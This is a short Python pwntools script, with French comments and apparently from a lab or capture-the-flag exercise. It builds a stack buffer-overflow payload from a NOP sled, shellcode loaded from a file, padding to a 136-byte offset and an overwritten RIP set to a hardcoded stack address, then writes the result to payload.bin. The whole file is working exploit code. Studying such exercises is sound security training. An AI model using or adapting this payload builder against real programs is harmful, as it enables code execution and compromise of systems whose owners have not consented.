from pwn import *

offset = 136

nop_sled = b"\x90" * 32

# shellcode modifié via cyberchef
with open("basic-shellcode.bin", "rb") as f:
    shellcode=f.read()

# padding pour meubler jusqu'au pointeur écrasant RIP 
padding = b"A" * (offset - len(nop_sled) - len(shellcode))

# valeur de rip pointant vers le début de la payload à calculer en amont
rip=p64(0x7fffffffd920)

payload = nop_sled + shellcode + padding + rip

with open("payload.bin", "wb") as f:
    f.write(payload)

print(payload)
